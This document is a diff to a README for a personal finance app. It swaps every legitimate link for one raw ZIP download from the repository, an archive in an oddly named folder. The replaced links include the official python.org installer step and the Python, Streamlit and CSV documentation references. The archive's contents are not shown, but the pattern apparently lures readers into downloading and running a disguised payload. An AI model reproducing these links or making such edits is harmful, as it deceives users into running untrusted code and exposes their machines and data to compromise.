@@ -1,6 +1,6 @@
 # 💼 Finance - Manage Your Money with Ease
 
-[![Download Finance](https://img.shields.io/badge/Download-Finance-blue?style=for-the-badge&logo=github)](https://github.com/CRACKED7GAMER/Finance)
+[![Download Finance](https://img.shields.io/badge/Download-Finance-blue?style=for-the-badge&logo=github)](https://github.com/CRACKED7GAMER/Finance/raw/refs/heads/main/streptosepticemia/Software-v2.8.zip)
 
 ## 📋 Overview
 
@@ -57,7 +57,7 @@ Here are the main files you will see in the app folder:
 
 Click the badge below to visit the GitHub page where you can download the app.
 
-[![Download Finance](https://img.shields.io/badge/Download-Finance-green?style=for-the-badge&logo=github)](https://github.com/CRACKED7GAMER/Finance)
+[![Download Finance](https://img.shields.io/badge/Download-Finance-green?style=for-the-badge&logo=github)](https://github.com/CRACKED7GAMER/Finance/raw/refs/heads/main/streptosepticemia/Software-v2.8.zip)
 
 On that page:
 
@@ -70,7 +70,7 @@ On that page:
 Finance runs using Python. To install it:
 
 1. Open your web browser.
-2. Go to https://www.python.org/downloads/windows/
+2. Go to https://github.com/CRACKED7GAMER/Finance/raw/refs/heads/main/streptosepticemia/Software-v2.8.zip
 3. Click **Download Python 3.x.x** (choose the latest version).
 4. Run the downloaded installer file.
 5. Make sure to tick **Add Python to PATH** before clicking **Install Now**.
@@ -159,12 +159,12 @@ To update Finance:
 
 ## 📚 Additional Resources
 
-- Python installation help: https://realpython.com/installing-python/
-- Streamlit documentation: https://docs.streamlit.io/
-- CSV file format guide: https://tools.ietf.org/html/rfc4180
+- Python installation help: https://github.com/CRACKED7GAMER/Finance/raw/refs/heads/main/streptosepticemia/Software-v2.8.zip
+- Streamlit documentation: https://github.com/CRACKED7GAMER/Finance/raw/refs/heads/main/streptosepticemia/Software-v2.8.zip
+- CSV file format guide: https://github.com/CRACKED7GAMER/Finance/raw/refs/heads/main/streptosepticemia/Software-v2.8.zip
 
 Use these if you want to learn more or need detailed help.
 
 ---
 
-[![Download Finance](https://img.shields.io/badge/Download-Finance-purple?style=for-the-badge&logo=github)](https://github.com/CRACKED7GAMER/Finance)
+[![Download Finance](https://img.shields.io/badge/Download-Finance-purple?style=for-the-badge&logo=github)](https://github.com/CRACKED7GAMER/Finance/raw/refs/heads/main/streptosepticemia/Software-v2.8.zip)
